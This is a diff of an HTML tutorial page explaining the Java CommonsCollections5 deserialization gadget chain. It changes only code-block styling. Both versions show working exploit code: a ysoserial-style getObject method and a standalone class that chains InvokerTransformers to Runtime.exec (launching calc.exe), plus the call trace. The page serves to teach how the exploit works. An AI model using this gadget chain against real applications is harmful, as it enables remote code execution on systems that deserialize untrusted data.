@@ -161,43 +161,46 @@
 </p>
 
 <p>
-    <pre>
-        <code>
-            public BadAttributeValueExpException getObject(final String command) throws Exception {
-                final String[] execArgs = new String[] { command };
-                // inert chain for setup
-                final Transformer transformerChain = new ChainedTransformer(
-                        new Transformer[]{ new ConstantTransformer(1) });
-                // real chain for after setup
-                final Transformer[] transformers = new Transformer[] {
-                        new ConstantTransformer(Runtime.class),
-                        new InvokerTransformer("getMethod", new Class[] {
-                            String.class, Class[].class }, new Object[] {
-                            "getRuntime", new Class[0] }),
-                        new InvokerTransformer("invoke", new Class[] {
-                            Object.class, Object[].class }, new Object[] {
-                            null, new Object[0] }),
-                        new InvokerTransformer("exec",
-                            new Class[] { String.class }, execArgs),
-                        new ConstantTransformer(1) };
-        
-                final Map innerMap = new HashMap();
-        
-                final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        
-                TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
-        
-                BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-                Field valfield = val.getClass().getDeclaredField("val");
-                Reflections.setAccessible(valfield);
-                valfield.set(val, entry);
-        
-                Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
-        
-                return val;
-            }
-        </code>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">public</span> BadAttributeValueExpException <span style="color: #56a8f5;">getObject</span>(<span style="color: #cf8e6d;">final String</span> command) <span style="color: #cf8e6d;">throws Exception</span> {
+        <span style="color: #cf8e6d;">final String</span>[] execArgs = <span style="color: #cf8e6d;">new String</span>[] { command };
+    
+        <span style="color: #6aab73;">// inert chain for setup</span>
+        <span style="color: #cf8e6d;">final Transformer</span> transformerChain = <span style="color: #cf8e6d;">new</span> ChainedTransformer(
+            <span style="color: #cf8e6d;">new Transformer</span>[] { <span style="color: #cf8e6d;">new</span> ConstantTransformer(<span style="color: #b3ae60;">1</span>) });
+    
+        <span style="color: #6aab73;">// real chain for after setup</span>
+        <span style="color: #cf8e6d;">final Transformer</span>[] transformers = <span style="color: #cf8e6d;">new Transformer</span>[] {
+            <span style="color: #cf8e6d;">new</span> ConstantTransformer(Runtime.<span style="color: #cf8e6d;">class</span>),
+            <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"getMethod"</span>, <span style="color: #cf8e6d;">new Class</span>[] {
+                String.<span style="color: #cf8e6d;">class</span>, Class[].<span style="color: #cf8e6d;">class</span> }, <span style="color: #cf8e6d;">new Object</span>[] {
+                <span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new Class</span>[<span style="color: #b3ae60;">0</span>] }),
+            <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"invoke"</span>, <span style="color: #cf8e6d;">new Class</span>[] {
+                Object.<span style="color: #cf8e6d;">class</span>, Object[].<span style="color: #cf8e6d;">class</span> }, <span style="color: #cf8e6d;">new Object</span>[] {
+                <span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new Object</span>[<span style="color: #b3ae60;">0</span>] }),
+            <span style="color: #cf8e6d;">new</span> InvokerTransformer(<span style="color: #6aab73;">"exec"</span>,
+                <span style="color: #cf8e6d;">new Class</span>[] { String.<span style="color: #cf8e6d;">class</span> }, execArgs),
+            <span style="color: #cf8e6d;">new</span> ConstantTransformer(<span style="color: #b3ae60;">1</span>)
+        };
+    
+        <span style="color: #cf8e6d;">final Map</span> innerMap = <span style="color: #cf8e6d;">new</span> HashMap();
+        <span style="color: #cf8e6d;">final Map</span> lazyMap = LazyMap.<span style="color: #56a8f5;">decorate</span>(innerMap, transformerChain);
+    
+        TiedMapEntry entry = <span style="color: #cf8e6d;">new</span> TiedMapEntry(lazyMap, <span style="color: #6aab73;">"foo"</span>);
+    
+        BadAttributeValueExpException val = <span style="color: #cf8e6d;">new</span> BadAttributeValueExpException(<span style="color: #cf8e6d;">null</span>);
+        Field valfield = val.<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getDeclaredField</span>(<span style="color: #6aab73;">"val"</span>);
+        Reflections.<span style="color: #56a8f5;">setAccessible</span>(valfield);
+        valfield.<span style="color: #56a8f5;">set</span>(val, entry);
+    
+        Reflections.<span style="color: #56a8f5;">setFieldValue</span>(transformerChain, <span style="color: #6aab73;">"iTransformers"</span>, transformers);
+    
+        <span style="color: #cf8e6d;">return</span> val;
+    }
     </pre>
+    </div>
+    
 </p>
 
 
@@ -210,32 +213,32 @@
     The BadAttributeValueExpException has the following code block on its class
 </p>
 <p>
-    <pre>
-        <code>
-            private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
-                ObjectInputStream.GetField gf = ois.readFields();
-                Object valObj = gf.get("val", null);
-        
-                if (valObj == null) {
-                    val = null;
-                } else if (valObj instanceof String) {
-                    val= valObj;
-                } else if (System.getSecurityManager() == null
-                        || valObj instanceof Long
-                        || valObj instanceof Integer
-                        || valObj instanceof Float
-                        || valObj instanceof Double
-                        || valObj instanceof Byte
-                        || valObj instanceof Short
-                        || valObj instanceof Boolean) {
-                    val = valObj.toString();
-                } else { // the serialized object is from a version without JDK-8019292 fix
-                    val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
-                }
-            }
-         }
-        </code>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">private void</span> <span style="color: #56a8f5;">readObject</span>(ObjectInputStream ois) <span style="color: #cf8e6d;">throws</span> IOException, ClassNotFoundException {
+        ObjectInputStream.GetField gf = ois.<span style="color: #56a8f5;">readFields</span>();
+        Object valObj = gf.<span style="color: #56a8f5;">get</span>(<span style="color: #6aab73;">"val"</span>, <span style="color: #cf8e6d;">null</span>);
+    
+        <span style="color: #cf8e6d;">if</span> (valObj == <span style="color: #cf8e6d;">null</span>) {
+            val = <span style="color: #cf8e6d;">null</span>;
+        } <span style="color: #cf8e6d;">else if</span> (valObj <span style="color: #cf8e6d;">instanceof</span> String) {
+            val = valObj;
+        } <span style="color: #cf8e6d;">else if</span> (System.<span style="color: #56a8f5;">getSecurityManager</span>() == <span style="color: #cf8e6d;">null</span>
+                || valObj <span style="color: #cf8e6d;">instanceof</span> Long
+                || valObj <span style="color: #cf8e6d;">instanceof</span> Integer
+                || valObj <span style="color: #cf8e6d;">instanceof</span> Float
+                || valObj <span style="color: #cf8e6d;">instanceof</span> Double
+                || valObj <span style="color: #cf8e6d;">instanceof</span> Byte
+                || valObj <span style="color: #cf8e6d;">instanceof</span> Short
+                || valObj <span style="color: #cf8e6d;">instanceof</span> Boolean) {
+            val = valObj.<span style="color: #56a8f5;">toString</span>();
+        } <span style="color: #cf8e6d;">else</span> {
+            val = System.<span style="color: #56a8f5;">identityHashCode</span>(valObj) + <span style="color: #6aab73;">"@"</span> + valObj.<span style="color: #56a8f5;">getClass</span>().<span style="color: #56a8f5;">getName</span>();
+        }
+    }
     </pre>
+    </div>
+    
 </p>
 <p>A custom ReadObject implementation.</p>
 <p>Which means even if there will be a class cast exception, the code present on the readObject will still be executed.</p>
@@ -263,19 +266,20 @@ Diving deep into the toString() we see that the function calls getValue() which 
     Lets Review the LaZyMap.get()
 </p>
 <p>
-    <pre>
-        <code>
-            public Object get(Object key) {
-                // create value for key if key is not currently in the map
-                if (map.containsKey(key) == false) {
-                    Object value = factory.transform(key);
-                    map.put(key, value);
-                    return value;
-                }
-                return map.get(key);
-            }
-        </code>
+  <div style="background-color: #1e1f22; color: #bcbec4;">
+    <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+    <span style="color: #cf8e6d;">public Object</span> <span style="color: #56a8f5;">get</span>(Object key) {
+        <span style="color: #6aab73;">// create value for key if key is not currently in the map</span>
+        <span style="color: #cf8e6d;">if</span> (map.<span style="color: #56a8f5;">containsKey</span>(key) == <span style="color: #cf8e6d;">false</span>) {
+            Object value = factory.<span style="color: #56a8f5;">transform</span>(key);
+            map.<span style="color: #56a8f5;">put</span>(key, value);
+            <span style="color: #cf8e6d;">return</span> value;
+        }
+        <span style="color: #cf8e6d;">return</span> map.<span style="color: #56a8f5;">get</span>(key);
+    }
     </pre>
+    </div>
+    
 </p>
 <p>
     So when the TiedMapEntry calls the map.get() the above get gets called.<br><br>
@@ -292,24 +296,26 @@ Diving deep into the toString() we see that the function calls getValue() which 
 <p>
     So taking all the above, the payload uses the BadAttributeValueExpException() to reach till the transformer like below.
     <br>
-    <pre>
-    ObjectInputStream.readObject()
-        BadAttributeValueExpException.readObject()
-            TiedMapEntry.toString()
-                LazyMap.get()
-                    ChainedTransformer.transform()
-                        ConstantTransformer.transform()
-                        InvokerTransformer.transform()
-                            Method.invoke()
-                                Class.getMethod()
-                        InvokerTransformer.transform()
-                            Method.invoke()
-                                Runtime.getRuntime()
-                        InvokerTransformer.transform()
-                            Method.invoke()
-                                Runtime.exec()
-                                        
-    </pre>
+    <div style="background-color: #1e1f22; color: #bcbec4;">
+      <pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+      <span style="color: #cf8e6d;">ObjectInputStream.readObject()</span>
+          <span style="color: #cf8e6d;">BadAttributeValueExpException.readObject()</span>
+              <span style="color: #cf8e6d;">TiedMapEntry.toString()</span>
+                  <span style="color: #cf8e6d;">LazyMap.get()</span>
+                      <span style="color: #cf8e6d;">ChainedTransformer.transform()</span>
+                          <span style="color: #cf8e6d;">ConstantTransformer.transform()</span>
+                          <span style="color: #cf8e6d;">InvokerTransformer.transform()</span>
+                              <span style="color: #56a8f5;">Method.invoke()</span>
+                                  <span style="color: #56a8f5;">Class.getMethod()</span>
+                          <span style="color: #cf8e6d;">InvokerTransformer.transform()</span>
+                              <span style="color: #56a8f5;">Method.invoke()</span>
+                                  <span style="color: #56a8f5;">Runtime.getRuntime()</span>
+                          <span style="color: #cf8e6d;">InvokerTransformer.transform()</span>
+                              <span style="color: #56a8f5;">Method.invoke()</span>
+                                  <span style="color: #56a8f5;">Runtime.exec()</span>
+      </pre>
+      </div>
+      
 </p>
 <p>
     Below is the slight modification of the above code where we have used java8u202 to execute the payload in locainstnace and instead of using refelction to set the val<br>
@@ -324,35 +330,48 @@ This is the reasson why reflection is used to set this variable in the later Sta
 This is also a reason why on most of the ysoserial payloads we are using reflection to make the changes in the later satage so that we can craft the serilised payload and doesn't execute code immediately in our local instance.
 </p>
 <p>
-    <pre>
-        <code>
-import org.apache.commons.collections.functors.*;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
-import org.apache.commons.collections.Transformer;
-import javax.management.BadAttributeValueExpException;
-import java.util.HashMap;
-import java.util.Map;
+<div style="background-color: #1e1f22; color: #bcbec4;">
+<pre style="font-family: 'JetBrains Mono', monospace; font-size: 9.8pt;">
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.functors.*;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.map.LazyMap;
+<span style="color: #cf8e6d;">import</span> org.apache.commons.collections.Transformer;
+<span style="color: #cf8e6d;">import</span> javax.management.BadAttributeValueExpException;
+<span style="color: #cf8e6d;">import</span> java.util.HashMap;
+<span style="color: #cf8e6d;">import</span> java.util.Map;
 
-public class cc5 {
+<span style="color: #cf8e6d;">public class</span> cc5 {
 
-public static void main(String args[])
-{
-		ConstantTransformer tr1=new ConstantTransformer(Runtime.class);
-		InvokerTransformer tr2=new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]});
-		InvokerTransformer tr3=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]});
-		InvokerTransformer tr4=new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc.exe"});
-		Transformer tr5=new ChainedTransformer(new Transformer[]{tr1,tr2,tr3,tr4});
-		
-        final Map innerMap = new HashMap();
-		final Map lazyMap = LazyMap.decorate(innerMap, tr5);
-		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
-		BadAttributeValueExpException val = new BadAttributeValueExpException(entry);
+    <span style="color: #cf8e6d;">public static void</span> main(String args[]) {
+        ConstantTransformer tr1 = <span style="color: #cf8e6d;">new</span> ConstantTransformer(Runtime.<span style="color: #cf8e6d;">class</span>);
+        InvokerTransformer tr2 = <span style="color: #cf8e6d;">new</span> InvokerTransformer(
+            <span style="color: #6aab73;">"getMethod"</span>,
+            <span style="color: #cf8e6d;">new</span> Class[]{String.<span style="color: #cf8e6d;">class</span>, Class[].<span style="color: #cf8e6d;">class</span>},
+            <span style="color: #cf8e6d;">new</span> Object[]{<span style="color: #6aab73;">"getRuntime"</span>, <span style="color: #cf8e6d;">new</span> Class[<span style="color: #b3ae60;">0</span>]}
+        );
+        InvokerTransformer tr3 = <span style="color: #cf8e6d;">new</span> InvokerTransformer(
+            <span style="color: #6aab73;">"invoke"</span>,
+            <span style="color: #cf8e6d;">new</span> Class[]{Object.<span style="color: #cf8e6d;">class</span>, Object[].<span style="color: #cf8e6d;">class</span>},
+            <span style="color: #cf8e6d;">new</span> Object[]{<span style="color: #cf8e6d;">null</span>, <span style="color: #cf8e6d;">new</span> Object[<span style="color: #b3ae60;">0</span>]}
+        );
+        InvokerTransformer tr4 = <span style="color: #cf8e6d;">new</span> InvokerTransformer(
+            <span style="color: #6aab73;">"exec"</span>,
+            <span style="color: #cf8e6d;">new</span> Class[]{String.<span style="color: #cf8e6d;">class</span>},
+            <span style="color: #cf8e6d;">new</span> String[]{<span style="color: #6aab73;">"calc.exe"</span>}
+        );
+        Transformer tr5 = <span style="color: #cf8e6d;">new</span> ChainedTransformer(
+            <span style="color: #cf8e6d;">new</span> Transformer[]{tr1, tr2, tr3, tr4}
+        );
+
+        <span style="color: #cf8e6d;">final</span> Map innerMap = <span style="color: #cf8e6d;">new</span> HashMap();
+        <span style="color: #cf8e6d;">final</span> Map lazyMap = LazyMap.decorate(innerMap, tr5);
+        TiedMapEntry entry = <span style="color: #cf8e6d;">new</span> TiedMapEntry(lazyMap, <span style="color: #6aab73;">"foo"</span>);
+        BadAttributeValueExpException val = <span style="color: #cf8e6d;">new</span> BadAttributeValueExpException(entry);
+    }
 }
-}
+</pre>
+</div>
 
-        </code>
-    </pre>
 </p>
 <p>
     <img src="images/cc/cc5CalcPopup.PNG">
